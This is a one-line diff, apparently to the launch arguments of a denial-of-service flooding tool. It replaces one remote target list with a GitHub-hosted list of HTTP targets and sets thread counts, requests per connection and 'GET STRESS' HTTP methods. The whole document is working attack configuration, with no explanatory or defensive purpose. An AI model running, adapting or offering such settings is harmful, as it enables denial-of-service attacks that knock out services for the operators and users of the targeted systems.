@@ -1,1 +1,1 @@
--c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt -t 1500 -p 4000 --rpc 2000 --table
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/1c/1c_l7_http -t 2000 --rpc 2000 --http-methods GET STRESS --table
